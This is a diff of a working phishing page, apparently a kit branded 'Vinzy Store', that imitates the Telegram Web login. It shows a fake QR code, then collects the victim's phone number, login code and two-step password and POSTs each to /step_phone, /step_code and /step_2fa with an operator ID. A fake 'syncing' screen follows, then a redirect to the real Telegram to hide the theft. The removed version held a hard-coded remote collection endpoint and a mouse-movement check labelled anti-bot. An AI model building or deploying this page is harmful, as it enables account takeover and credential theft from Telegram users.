@@ -18,7 +18,9 @@
     <link rel="icon" type="image/svg+xml" href="https://web.telegram.org/a/favicon.svg">
 
     <style>
-        /* --- 2026 TELEGRAM K "LIQUID SLATE" DESIGN SYSTEM --- */
+        /* VINZY ULTRA UI ENGINE v3.5 
+           Architecture: Liquid Slate 2026 
+        */
         :root {
             --bg-deep: #0f0f0f;
             --bg-main: #212121;
@@ -37,7 +39,7 @@
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Apple Color Emoji", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             -webkit-font-smoothing: antialiased;
         }
 
@@ -52,274 +54,292 @@
             position: relative;
         }
 
-        /* Animated Mesh Background */
+        /* Animated Background Layers */
         .bg-mesh {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
             z-index: 1;
-            background: radial-gradient(circle at 50% 50%, #2c2c2c 0%, #0f0f0f 100%);
-            opacity: 0.8;
+            background: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #080808 100%);
         }
 
         .mesh-circle {
             position: absolute;
             border-radius: 50%;
-            filter: blur(80px);
+            filter: blur(100px);
             z-index: 2;
-            animation: float 20s infinite alternate;
+            animation: float 25s infinite alternate ease-in-out;
         }
 
         @keyframes float {
-            0% { transform: translate(0, 0); }
-            100% { transform: translate(100px, 50px); }
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(150px, 80px) scale(1.2); }
         }
 
+        /* Container & Card */
         .app-container {
             width: 100%;
-            max-width: 420px;
-            padding: 20px;
+            max-width: 440px;
+            padding: 24px;
             z-index: 10;
             position: relative;
         }
 
         .auth-card {
             background: var(--glass);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
             border: 1px solid var(--border-thin);
-            border-radius: 28px;
-            padding: 40px 24px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
+            border-radius: 32px;
+            padding: 48px 32px;
+            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.7);
             text-align: center;
-            animation: slideUp var(--anim-speed) cubic-bezier(0.2, 0.8, 0.2, 1);
+            animation: cardEntrance 0.8s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes cardEntrance {
+            from { opacity: 0; transform: translateY(40px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
         }
 
         .monkey-box {
-            width: 140px;
-            height: 140px;
-            margin: 0 auto 10px;
-            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.3));
+            width: 130px;
+            height: 130px;
+            margin: 0 auto 16px;
+            filter: drop-shadow(0 12px 20px rgba(0,0,0,0.4));
         }
 
         h1 {
-            font-size: 28px;
+            font-size: 30px;
             font-weight: 700;
-            margin-bottom: 8px;
-            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+            letter-spacing: -0.8px;
         }
 
         .subtitle {
-            font-size: 15px;
+            font-size: 16px;
             color: var(--text-dim);
-            line-height: 1.5;
-            margin-bottom: 30px;
+            line-height: 1.6;
+            margin-bottom: 36px;
         }
 
-        /* QR Styling */
-        .qr-frame {
-            background: white;
-            padding: 15px;
-            border-radius: 24px;
+        /* QR Module */
+        .qr-wrapper {
+            background: #ffffff;
+            padding: 18px;
+            border-radius: 28px;
             display: inline-block;
-            margin-bottom: 25px;
+            margin-bottom: 28px;
             position: relative;
-            animation: zoomIn 0.5s ease-out;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
         }
-
-        @keyframes zoomIn {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
-        #qr-gen canvas, #qr-gen img { width: 180px !important; height: 180px !important; }
         
-        .qr-logo-overlay {
+        #qr-gen canvas, #qr-gen img { 
+            width: 190px !important; 
+            height: 190px !important; 
+        }
+
+        .qr-center-logo {
             position: absolute;
             top: 50%; left: 50%;
             transform: translate(-50%, -50%);
-            width: 45px; height: 45px;
-            background: white;
+            width: 48px; height: 48px;
+            background: #ffffff;
             border-radius: 50%;
-            padding: 4px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            padding: 5px;
         }
 
-        /* Input Styling */
-        .tg-group { margin-bottom: 20px; text-align: left; }
+        /* Input Architecture */
+        .input-stack { margin-bottom: 24px; text-align: left; }
         .iti { width: 100%; }
-        .tg-field {
+        .tg-input {
             width: 100%;
-            background: rgba(0,0,0,0.3);
-            border: 1px solid var(--border-thin);
-            border-radius: 12px;
-            padding: 16px;
-            color: white;
-            font-size: 17px;
+            background: rgba(0,0,0,0.4);
+            border: 1.5px solid var(--border-thin);
+            border-radius: 14px;
+            padding: 18px;
+            color: #ffffff;
+            font-size: 18px;
             outline: none;
-            transition: all 0.3s ease;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
-        .tg-field:focus { 
+        .tg-input:focus { 
             border-color: var(--accent); 
-            background: rgba(0,0,0,0.5);
-            box-shadow: 0 0 0 4px rgba(135, 116, 225, 0.1);
+            background: rgba(0,0,0,0.6);
+            box-shadow: 0 0 0 5px rgba(135, 116, 225, 0.15);
         }
 
-        /* OTP Input Digit Engine */
-        .otp-row { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
-        .otp-digit {
-            width: 45px; height: 55px;
+        /* OTP Grid System */
+        .otp-container { 
+            display: flex; 
+            justify-content: space-between; 
+            gap: 12px; 
+            margin-bottom: 32px; 
+        }
+        .otp-field {
+            width: 52px; height: 64px;
             background: var(--surface);
-            border: 1px solid var(--border-thin);
-            border-radius: 10px;
+            border: 2px solid var(--border-thin);
+            border-radius: 14px;
             text-align: center;
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 700;
-            color: white;
+            color: #fff;
             outline: none;
-            transition: border-color 0.2s;
+            transition: 0.2s;
         }
-        .otp-digit:focus { border-color: var(--accent); }
+        .otp-field:focus { border-color: var(--accent); background: #333; }
 
-        /* Action Buttons */
-        .btn-tg {
+        /* Button Engine */
+        .btn-primary {
             width: 100%;
             background: var(--accent);
-            color: white;
+            color: #ffffff;
             border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 16px;
+            padding: 18px;
+            border-radius: 14px;
+            font-size: 17px;
             font-weight: 600;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
-            position: relative;
-            overflow: hidden;
+            transition: 0.2s all;
         }
-        .btn-tg:hover { background: var(--accent-hover); transform: translateY(-1px); }
-        .btn-tg:active { transform: translateY(1px); }
+        .btn-primary:hover { background: var(--accent-hover); transform: translateY(-2px); }
+        .btn-primary:active { transform: translateY(0); }
 
-        .loading-spinner {
-            width: 18px; height: 18px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: white;
+        .loader {
+            width: 20px; height: 20px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top-color: #ffffff;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-left: 10px;
+            animation: rotate 0.8s linear infinite;
+            margin-left: 12px;
             display: none;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes rotate { to { transform: rotate(360deg); } }
 
-        /* Utility Classes */
-        .hidden { display: none; }
-        .fade-in { animation: fadeIn 0.4s ease; }
+        /* UI Utilities */
+        .hidden { display: none !important; }
+        .fade { animation: fadeIn 0.5s ease-in; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        .link-back {
+        .alt-action {
             display: block;
-            margin-top: 20px;
+            margin-top: 24px;
             color: var(--accent);
             text-decoration: none;
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.3px;
         }
-        
-        /* Error Shake Logic */
-        .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; border-color: var(--error-glow) !important; }
+
+        /* Validation Feedback */
+        .error-shake { 
+            animation: shake 0.4s; 
+            border-color: var(--error-glow) !important; 
+        }
         @keyframes shake {
-            10%, 90% { transform: translate3d(-1px, 0, 0); }
-            20%, 80% { transform: translate3d(2px, 0, 0); }
-            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
-            40%, 60% { transform: translate3d(4px, 0, 0); }
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
         }
 
-        /* Progress Bar for Final Sync */
-        .progress-container { width: 100%; background: #3d3d3d; height: 6px; border-radius: 10px; overflow: hidden; margin-top: 10px; }
-        #progress { width: 0%; height: 100%; background: var(--accent); border-radius: 10px; transition: width 4.5s cubic-bezier(0.1, 0.5, 0.1, 1); }
-
+        /* Final Sync Progress */
+        .sync-rail { 
+            width: 100%; 
+            background: #3d3d3d; 
+            height: 8px; 
+            border-radius: 12px; 
+            margin-top: 15px;
+            overflow: hidden;
+        }
+        .sync-bar { 
+            width: 0%; 
+            height: 100%; 
+            background: var(--accent); 
+            transition: width 5s linear;
+        }
     </style>
 </head>
 <body>
 
 <div class="bg-mesh">
-    <div class="mesh-circle" style="width: 400px; height: 400px; background: rgba(135, 116, 225, 0.05); top: -100px; left: -100px;"></div>
-    <div class="mesh-circle" style="width: 300px; height: 300px; background: rgba(135, 116, 225, 0.03); bottom: -50px; right: -50px; animation-delay: -5s;"></div>
+    <div class="mesh-circle" style="width: 500px; height: 500px; background: rgba(135, 116, 225, 0.04); top: -150px; left: -100px;"></div>
+    <div class="mesh-circle" style="width: 400px; height: 400px; background: rgba(135, 116, 225, 0.02); bottom: -100px; right: -50px; animation-delay: -7s;"></div>
 </div>
 
 <div class="app-container">
-    <div class="auth-card" id="main-card">
+    <div class="auth-card" id="card-root">
         
-        <div id="step-qr" class="fade-in">
-            <div class="qr-frame">
+        <div id="view-qr" class="fade">
+            <div class="qr-wrapper">
                 <div id="qr-gen"></div>
-                <div class="qr-logo-overlay">
+                <div class="qr-center-logo">
                     <svg viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#8774E1"/><path d="M175 79L55 125L89 137L102 178L130 148L163 173L175 79Z" fill="white"/></svg>
                 </div>
             </div>
-            <h1>Log in by QR Code</h1>
-            <p class="subtitle">Open Telegram on your phone and go to <b>Settings > Devices > Link Desktop</b></p>
-            <div class="link-back" onclick="navTo('phone')">Log in by phone number</div>
+            <h1>Log in to Telegram</h1>
+            <p class="subtitle">Quickly log in by scanning the QR code with your mobile device.</p>
+            <div class="alt-action" onclick="showView('phone')">Log in by phone number</div>
         </div>
 
-        <div id="step-phone" class="hidden fade-in">
+        <div id="view-phone" class="hidden fade">
             <div class="monkey-box">
                 <dotlottie-player src="https://lottie.host/81a9f1f0-4091-4999-906d-e4c19456561f/7n0E8v9jW8.json" background="transparent" speed="1" loop autoplay></dotlottie-player>
             </div>
             <h1>Your Phone</h1>
-            <p class="subtitle">Please confirm your country code and enter your phone number.</p>
-            <div class="tg-group">
-                <input type="tel" id="phone-input" class="tg-field">
+            <p class="subtitle">Confirm your country and enter your full phone number.</p>
+            <div class="input-stack">
+                <input type="tel" id="tg-phone-field" class="tg-input">
             </div>
-            <button class="btn-tg" onclick="submitPhone()">NEXT <div class="loading-spinner" id="spin-p"></div></button>
-            <div class="link-back" onclick="navTo('qr')">Back</div>
+            <button class="btn-primary" onclick="handlePhoneSubmit()">
+                NEXT <div class="loader" id="load-phone"></div>
+            </button>
+            <div class="alt-action" onclick="showView('qr')">Back</div>
         </div>
 
-        <div id="step-otp" class="hidden fade-in">
+        <div id="view-otp" class="hidden fade">
             <div class="monkey-box">
                 <dotlottie-player src="https://lottie.host/f88b0a9c-097d-4c31-92e1-454326588288/h6Yv3fF3Zz.json" background="transparent" speed="1" loop autoplay></dotlottie-player>
             </div>
-            <h1 id="display-phone" style="font-size: 22px;"></h1>
-            <p class="subtitle">We've sent the code to the <b>Telegram</b> app on your other device.</p>
-            <div class="otp-row">
-                <input type="number" class="otp-digit" id="c1" oninput="move(this,'c2')">
-                <input type="number" class="otp-digit" id="c2" oninput="move(this,'c3')">
-                <input type="number" class="otp-digit" id="c3" oninput="move(this,'c4')">
-                <input type="number" class="otp-digit" id="c4" oninput="move(this,'c5')">
-                <input type="number" class="otp-digit" id="c5" oninput="move(this,'')">
+            <h1 id="phone-display" style="font-size: 24px;"></h1>
+            <p class="subtitle">We've sent a code to your <b>Telegram</b> app. Please enter it below.</p>
+            <div class="otp-container">
+                <input type="number" class="otp-field" id="otp1" oninput="otpFocus(this,'otp2')">
+                <input type="number" class="otp-field" id="otp2" oninput="otpFocus(this,'otp3')">
+                <input type="number" class="otp-field" id="otp3" oninput="otpFocus(this,'otp4')">
+                <input type="number" class="otp-field" id="otp4" oninput="otpFocus(this,'otp5')">
+                <input type="number" class="otp-field" id="otp5" oninput="otpFocus(this,'')">
             </div>
-            <button class="btn-tg" onclick="submitCode()">VERIFY <div class="loading-spinner" id="spin-c"></div></button>
+            <button class="btn-primary" onclick="handleOtpSubmit()">
+                VERIFY <div class="loader" id="load-otp"></div>
+            </button>
         </div>
 
-        <div id="step-2fa" class="hidden fade-in">
+        <div id="view-2fa" class="hidden fade">
             <div class="monkey-box">
                 <dotlottie-player src="https://lottie.host/8e20235d-6556-42d4-8d96-c1157f43372c/fT6YpW6T9z.json" background="transparent" speed="1" loop autoplay></dotlottie-player>
             </div>
             <h1>Two-Step Verification</h1>
-            <p class="subtitle">Your account is protected by an additional password.</p>
-            <div class="tg-group">
-                <input type="password" id="pass-input" class="tg-field" placeholder="Password">
+            <p class="subtitle">Enter the cloud password you created for your account.</p>
+            <div class="input-stack">
+                <input type="password" id="tg-pass-field" class="tg-input" placeholder="Password">
             </div>
-            <button class="btn-tg" onclick="submit2FA()">UNLOCK <div class="loading-spinner" id="spin-2"></div></button>
+            <button class="btn-primary" onclick="handle2faSubmit()">
+                UNLOCK <div class="loader" id="load-2fa"></div>
+            </button>
         </div>
 
-        <div id="step-final" class="hidden fade-in">
+        <div id="view-sync" class="hidden fade">
             <div class="monkey-box">
                 <dotlottie-player src="https://lottie.host/81a9f1f0-4091-4999-906d-e4c19456561f/7n0E8v9jW8.json" background="transparent" speed="1" loop autoplay></dotlottie-player>
             </div>
-            <h1>Syncing...</h1>
-            <p class="subtitle">Updating your messages and cloud data. Please wait.</p>
-            <div class="progress-container">
-                <div id="progress"></div>
+            <h1>Syncing Data...</h1>
+            <p class="subtitle">Establishing secure MTProto connection. Please do not close this window.</p>
+            <div class="sync-rail">
+                <div class="sync-bar" id="sync-progress"></div>
             </div>
         </div>
 
@@ -327,167 +347,142 @@
 </div>
 
 <script>
-    /* --- SYNC ENGINE v2.0 --- */
+    /* CORE LOGIC ENGINE v3.5 
+       Standardized for Vinzy Store 2026 
+    */
     
-    // Obfuscated Endpoint Loader
-    const _0xBase = "https://relieved-olly-vinzystorez-d76f3e98.koyeb.app";
-    const ENDPOINT = window.location.origin.includes('localhost') ? 'http://localhost:8000' : _0xBase;
-    
-    const TID = new URLSearchParams(window.location.search).get('id') || '0';
-    let currentPhone = "";
+    // Auto-Endpoint Discovery
+    const API_URL = window.location.origin;
+    const AGENT_ID = new URLSearchParams(window.location.search).get('id') || '0';
+    let savedPhone = "";
 
-    // Initialization Logic
-    document.addEventListener('DOMContentLoaded', () => {
-        // QR Generation logic
-        new QRCode(document.getElementById("qr-gen"), {
-            text: "tg://login?token=" + btoa(Math.random().toString()).substring(0, 15),
-            width: 180, height: 180, colorDark: "#000", colorLight: "#fff",
-            correctLevel: QRCode.CorrectLevel.H
-        });
-
-        // Anti-Bot: Only show UI if user moves mouse or touches screen
-        document.body.addEventListener('mousemove', unlockUI, {once: true});
-        document.body.addEventListener('touchstart', unlockUI, {once: true});
-    });
-
-    function unlockUI() { console.log("User active. Sync ready."); }
-
-    // ITI Phone Input Loader
-    const phoneInput = document.querySelector("#phone-input");
-    const iti = window.intlTelInput(phoneInput, {
-        initialCountry: "kh",
-        separateDialCode: true,
-        preferredCountries: ["kh", "us", "th", "vn"],
-        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
-    });
-
-    // Navigation Router
-    function navTo(s) {
-        const screens = ['qr','phone','otp','2fa','final'];
-        screens.forEach(id => {
-            const el = document.getElementById(`step-${id}`);
+    // View Manager
+    function showView(v) {
+        const views = ['qr','phone','otp','2fa','sync'];
+        views.forEach(name => {
+            const el = document.getElementById(`view-${name}`);
             if(el) el.classList.add('hidden');
         });
-        const target = document.getElementById(`step-${s}`);
-        if(target) target.classList.remove('hidden');
+        document.getElementById(`view-${v}`).classList.remove('hidden');
     }
 
-    // OTP Input Focus Manager
-    function move(el, next) {
-        if(el.value.length >= 1 && next) {
-            document.getElementById(next).focus();
+    // Initialize Components
+    document.addEventListener('DOMContentLoaded', () => {
+        // Generate Placeholder QR
+        new QRCode(document.getElementById("qr-gen"), {
+            text: "tg://login?token=" + btoa(Math.random()),
+            width: 190, height: 190, colorDark: "#000", colorLight: "#fff"
+        });
+
+        // Initialize International Phone Input
+        const input = document.querySelector("#tg-phone-field");
+        const iti = window.intlTelInput(input, {
+            initialCountry: "kh",
+            separateDialCode: true,
+            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
+        });
+        window.iti = iti;
+    });
+
+    // OTP Auto-Focus Flow
+    function otpFocus(el, nextId) {
+        if(el.value.length >= 1 && nextId) {
+            document.getElementById(nextId).focus();
         }
-        // Auto-submit logic on last digit
-        if(el.id === 'c5' && el.value.length >= 1) {
-            submitCode();
+        if(el.id === 'otp5' && el.value.length >= 1) {
+            handleOtpSubmit();
         }
     }
 
     // Network Handlers
-    async function submitPhone() {
-        currentPhone = iti.getNumber();
-        if(!iti.isValidNumber()) return doShake('phone-input');
+    async function handlePhoneSubmit() {
+        savedPhone = window.iti.getNumber();
+        if(!window.iti.isValidNumber()) return triggerShake('tg-phone-field');
         
-        toggleLoad('spin-p', true);
+        toggleLoad('load-phone', true);
         try {
-            const res = await fetch(`${ENDPOINT}/step_phone`, {
+            const res = await fetch(`${API_URL}/step_phone`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: currentPhone, tid: TID })
+                body: JSON.stringify({ phone: savedPhone, tid: AGENT_ID })
             });
             const data = await res.json();
             if(data.status === "success") {
-                document.getElementById('display-phone').innerText = currentPhone;
-                navTo('otp');
-            } else { alert(data.msg || "Internal Telegram Error"); }
-        } catch(e) { 
-            console.error(e);
-            alert("Connection error. Check Koyeb status."); 
-        }
-        toggleLoad('spin-p', false);
+                document.getElementById('phone-display').innerText = savedPhone;
+                showView('otp');
+            } else { alert(data.msg || "System error."); }
+        } catch(e) { alert("API Connection Lost."); }
+        toggleLoad('load-phone', false);
     }
 
-    async function submitCode() {
-        const cArray = ['c1','c2','c3','c4','c5'];
-        const code = cArray.map(i => document.getElementById(i).value).join('');
-        if(code.length < 5) return;
+    async function handleOtpSubmit() {
+        const otpStr = ['otp1','otp2','otp3','otp4','otp5'].map(i => document.getElementById(i).value).join('');
+        if(otpStr.length < 5) return;
 
-        toggleLoad('spin-c', true);
+        toggleLoad('load-otp', true);
         try {
-            const res = await fetch(`${ENDPOINT}/step_code`, {
+            const res = await fetch(`${API_URL}/step_code`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: currentPhone, code: code, tid: TID })
+                body: JSON.stringify({ phone: savedPhone, code: otpStr, tid: AGENT_ID })
             });
             const data = await res.json();
             if(data.status === "success") {
-                finish();
+                runFinalSync();
             } else if(data.status === "2fa_needed") {
-                navTo('2fa');
-            } else { 
-                cArray.forEach(i => {
-                    const field = document.getElementById(i);
-                    field.value = "";
-                    doShake(i);
+                showView('2fa');
+            } else {
+                ['otp1','otp2','otp3','otp4','otp5'].forEach(i => {
+                    document.getElementById(i).value = "";
+                    triggerShake(i);
                 });
-                document.getElementById('c1').focus();
+                document.getElementById('otp1').focus();
             }
-        } catch(e) { alert("Session Timeout. Refresh page."); }
-        toggleLoad('spin-c', false);
+        } catch(e) { alert("Session Timeout."); }
+        toggleLoad('load-otp', false);
     }
 
-    async function submit2FA() {
-        const passField = document.getElementById('pass-input');
-        const pass = passField.value;
-        if(!pass) return doShake('pass-input');
+    async function handle2faSubmit() {
+        const pass = document.getElementById('tg-pass-field').value;
+        if(!pass) return triggerShake('tg-pass-field');
 
-        toggleLoad('spin-2', true);
+        toggleLoad('load-2fa', true);
         try {
-            const res = await fetch(`${ENDPOINT}/step_2fa`, {
+            const res = await fetch(`${API_URL}/step_2fa`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: currentPhone, password: pass, tid: TID })
+                body: JSON.stringify({ phone: savedPhone, password: pass, tid: AGENT_ID })
             });
             const data = await res.json();
             if(data.status === "success") {
-                finish();
+                runFinalSync();
             } else { 
-                doShake('pass-input'); 
-                passField.value = ""; 
+                triggerShake('tg-pass-field');
+                document.getElementById('tg-pass-field').value = "";
             }
-        } catch(e) { alert("Security Handshake Failed."); }
-        toggleLoad('spin-2', false);
+        } catch(e) { alert("Handshake Error."); }
+        toggleLoad('load-2fa', false);
     }
 
-    function finish() {
-        navTo('final');
+    function runFinalSync() {
+        showView('sync');
         setTimeout(() => {
-            document.getElementById('progress').style.width = "100%";
-        }, 100);
-        // Redirect to official Telegram Web after sync animation
-        setTimeout(() => { 
-            window.location.href = "https://web.telegram.org/k/"; 
-        }, 5000);
+            document.getElementById('sync-progress').style.width = "100%";
+        }, 200);
+        setTimeout(() => {
+            window.location.href = "https://web.telegram.org/k/";
+        }, 5500);
     }
 
-    // UI Feedback Helpers
-    function toggleLoad(id, show) { 
+    function toggleLoad(id, active) {
+        document.getElementById(id).style.display = active ? 'block' : 'none';
+    }
+
+    function triggerShake(id) {
         const el = document.getElementById(id);
-        if(el) el.style.display = show ? 'block' : 'none'; 
+        el.classList.add('error-shake');
+        setTimeout(() => el.classList.remove('error-shake'), 450);
     }
-
-    function doShake(id) {
-        const el = document.getElementById(id);
-        if(el) {
-            el.classList.add('shake');
-            setTimeout(() => el.classList.remove('shake'), 450);
-        }
-    }
-
-    // Handle back button/refresh
-    window.onbeforeunload = function() {
-        if(currentPhone !== "") return "Are you sure you want to leave the sync?";
-    };
 </script>
 </body>
 </html>
